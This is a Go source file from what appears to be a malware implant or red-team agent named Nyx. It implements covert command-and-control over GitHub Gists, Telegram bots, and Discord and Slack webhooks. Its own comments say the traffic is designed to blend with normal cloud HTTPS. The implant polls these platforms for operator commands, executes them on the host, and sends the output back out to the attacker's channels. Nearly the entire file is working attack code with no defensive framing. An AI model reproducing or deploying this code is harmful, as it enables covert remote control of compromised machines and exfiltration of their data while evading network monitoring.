package main

// External C2 — beacon over legitimate cloud platforms (GitHub Gist, Telegram, Discord, Slack).
// All traffic blends with normal HTTPS to known CDN/cloud IPs.

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

type extC2Type string

const (
	ExtC2GitHub   extC2Type = "github"
	ExtC2Telegram extC2Type = "telegram"
	ExtC2Discord  extC2Type = "discord"
	ExtC2Slack    extC2Type = "slack"
)

type extC2Config struct {
	Type extC2Type
	// GitHub Gist
	GistID    string
	GistToken string
	// Telegram
	BotToken string
	ChatID   string
	// Discord / Slack
	WebhookURL string
	// Common
	PollSecs int
}

var (
	extC2Running bool
	extC2Cfg     *extC2Config
	extC2StopCh  chan struct{}
	extC2Mu      sync.Mutex
)

func startExtC2(cfg extC2Config) (string, error) {
	extC2Mu.Lock()
	defer extC2Mu.Unlock()
	if extC2Running {
		return "", fmt.Errorf("external C2 already running (%s) — stop first", extC2Cfg.Type)
	}
	if cfg.PollSecs <= 0 {
		cfg.PollSecs = 30
	}
	extC2Cfg = &cfg
	extC2StopCh = make(chan struct{})
	extC2Running = true
	go extC2Loop(cfg, extC2StopCh)
	return fmt.Sprintf("[extc2] %s channel started (poll: %ds)", cfg.Type, cfg.PollSecs), nil
}

func stopExtC2() string {
	extC2Mu.Lock()
	defer extC2Mu.Unlock()
	if !extC2Running {
		return "[extc2] not running"
	}
	close(extC2StopCh)
	extC2Running = false
	t := extC2Cfg.Type
	extC2Cfg = nil
	return fmt.Sprintf("[extc2] %s channel stopped", t)
}

func extC2Status() string {
	extC2Mu.Lock()
	defer extC2Mu.Unlock()
	if !extC2Running || extC2Cfg == nil {
		return "[extc2] not running"
	}
	return fmt.Sprintf("[extc2] active\n  type: %s\n  poll: %ds", extC2Cfg.Type, extC2Cfg.PollSecs)
}

func extC2Loop(cfg extC2Config, stop chan struct{}) {
	ticker := time.NewTicker(time.Duration(cfg.PollSecs) * time.Second)
	defer ticker.Stop()
	var tgOffset int64

	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			var cmd, cmdID string

			switch cfg.Type {
			case ExtC2GitHub:
				cmd, cmdID, _ = githubGistPoll(cfg)
			case ExtC2Telegram:
				var newOffset int64
				cmd, cmdID, newOffset, _ = telegramPoll(cfg, tgOffset)
				tgOffset = newOffset
			case ExtC2Discord, ExtC2Slack:
				// webhook-only (results push); operator sends commands via Nyx console
				continue
			}

			if cmd == "" {
				continue
			}

			output, status := dispatch(cmd)
			result := fmt.Sprintf("[%s] %s\n---\n%s", status, cmd, c2Truncate(output, 3800))

			switch cfg.Type {
			case ExtC2GitHub:
				_ = githubGistResult(cfg, cmdID, cmd, output, status)
			case ExtC2Telegram:
				telegramSend(cfg, result)
			}
		}
	}
}

// ── HTTP helper ────────────────────────────────────────────────────────────────

func extC2HTTP(method, url string, headers map[string]string, body interface{}) ([]byte, error) {
	var r io.Reader
	if body != nil {
		b, err := json.Marshal(body)
		if err != nil {
			return nil, err
		}
		r = bytes.NewBuffer(b)
	}
	req, err := http.NewRequest(method, url, r)
	if err != nil {
		return nil, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	return io.ReadAll(resp.Body)
}

func c2Truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "\n...(truncated)"
}

// ── GitHub Gist C2 ────────────────────────────────────────────────────────────
// Protocol:
//   Operator writes to "nyx_cmd.json"  → {"id":"<uuid>","cmd":"<command>","consumed":false}
//   Agent marks consumed, writes result to "nyx_result.json"

func githubGistHeaders(token string) map[string]string {
	return map[string]string{
		"Authorization": "token " + token,
		"Accept":        "application/vnd.github.v3+json",
	}
}

func githubGistPoll(cfg extC2Config) (cmd, id string, err error) {
	url := "https://api.github.com/gists/" + cfg.GistID
	data, err := extC2HTTP("GET", url, githubGistHeaders(cfg.GistToken), nil)
	if err != nil {
		return "", "", err
	}
	var gist struct {
		Files map[string]struct {
			Content string `json:"content"`
		} `json:"files"`
	}
	if err := json.Unmarshal(data, &gist); err != nil {
		return "", "", err
	}
	f, ok := gist.Files["nyx_cmd.json"]
	if !ok || f.Content == "" {
		return "", "", nil
	}
	var payload struct {
		ID       string `json:"id"`
		Cmd      string `json:"cmd"`
		Consumed bool   `json:"consumed"`
	}
	if err := json.Unmarshal([]byte(f.Content), &payload); err != nil {
		return "", "", nil
	}
	if payload.Consumed || payload.Cmd == "" {
		return "", "", nil
	}

	// Mark consumed immediately to avoid double execution
	consumed, _ := json.Marshal(map[string]interface{}{
		"id": payload.ID, "cmd": payload.Cmd, "consumed": true,
	})
	_, _ = extC2HTTP("PATCH", url, githubGistHeaders(cfg.GistToken), map[string]interface{}{
		"files": map[string]interface{}{
			"nyx_cmd.json": map[string]string{"content": string(consumed)},
		},
	})
	return payload.Cmd, payload.ID, nil
}

func githubGistResult(cfg extC2Config, id, cmd, output, status string) error {
	url := "https://api.github.com/gists/" + cfg.GistID
	result, _ := json.Marshal(map[string]string{
		"id": id, "cmd": cmd, "output": c2Truncate(output, 60000), "status": status,
	})
	_, err := extC2HTTP("PATCH", url, githubGistHeaders(cfg.GistToken), map[string]interface{}{
		"files": map[string]interface{}{
			"nyx_result.json": map[string]string{"content": string(result)},
		},
	})
	return err
}

// GitHubGistPush lets the operator push a command to the gist (called from server-side relay).
func githubGistPush(cfg extC2Config, taskID, cmd string) error {
	url := "https://api.github.com/gists/" + cfg.GistID
	payload, _ := json.Marshal(map[string]interface{}{
		"id": taskID, "cmd": cmd, "consumed": false,
	})
	_, err := extC2HTTP("PATCH", url, githubGistHeaders(cfg.GistToken), map[string]interface{}{
		"files": map[string]interface{}{
			"nyx_cmd.json": map[string]string{"content": string(payload)},
		},
	})
	return err
}

// ── Telegram Bot C2 ───────────────────────────────────────────────────────────
// Operator sends commands as messages to the bot.
// Agent polls getUpdates, executes, replies.

func telegramPoll(cfg extC2Config, offset int64) (cmd, id string, newOffset int64, err error) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates?offset=%d&timeout=2",
		cfg.BotToken, offset)
	data, err := extC2HTTP("GET", url, nil, nil)
	if err != nil {
		return "", "", offset, err
	}
	var resp struct {
		OK     bool `json:"ok"`
		Result []struct {
			UpdateID int64 `json:"update_id"`
			Message  struct {
				MessageID int64  `json:"message_id"`
				Text      string `json:"text"`
				Chat      struct {
					ID int64 `json:"id"`
				} `json:"chat"`
			} `json:"message"`
		} `json:"result"`
	}
	if err := json.Unmarshal(data, &resp); err != nil || !resp.OK || len(resp.Result) == 0 {
		return "", "", offset, nil
	}
	last := resp.Result[len(resp.Result)-1]
	newOffset = last.UpdateID + 1

	// Filter by ChatID if configured
	chatIDStr := fmt.Sprintf("%d", last.Message.Chat.ID)
	if cfg.ChatID != "" && chatIDStr != cfg.ChatID {
		return "", "", newOffset, nil
	}
	text := strings.TrimSpace(last.Message.Text)
	if text == "" {
		return "", "", newOffset, nil
	}
	return text, fmt.Sprintf("tg_%d", last.Message.MessageID), newOffset, nil
}

func telegramSend(cfg extC2Config, text string) {
	url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", cfg.BotToken)
	_, _ = extC2HTTP("POST", url, nil, map[string]interface{}{
		"chat_id":    cfg.ChatID,
		"text":       c2Truncate(text, 4000),
		"parse_mode": "Markdown",
	})
}

// ── Discord Webhook ───────────────────────────────────────────────────────────
// Results-only push — operator sends commands via the Nyx console,
// results are mirrored to the Discord channel for logging/visibility.

func discordSend(webhookURL, content string) error {
	_, err := extC2HTTP("POST", webhookURL, nil, map[string]string{
		"content": c2Truncate(content, 2000),
	})
	return err
}

// ── Slack Incoming Webhook ────────────────────────────────────────────────────

func slackSend(webhookURL, text string) error {
	_, err := extC2HTTP("POST", webhookURL, nil, map[string]interface{}{
		"text": c2Truncate(text, 3000),
	})
	return err
}

// extC2Mirror sends a task result to all configured webhook mirrors (Discord/Slack).
// Called from handleTask after result is submitted, if mirrors are configured.
var extC2DiscordMirror string
var extC2SlackMirror   string

func mirrorResult(cmd, output, status string) {
	msg := fmt.Sprintf("**[%s]** `%s`\n```\n%s\n```", status, cmd, c2Truncate(output, 1800))
	if extC2DiscordMirror != "" {
		_ = discordSend(extC2DiscordMirror, msg)
	}
	if extC2SlackMirror != "" {
		_ = slackSend(extC2SlackMirror, fmt.Sprintf("[%s] `%s`\n%s", status, cmd, c2Truncate(output, 2900)))
	}
}
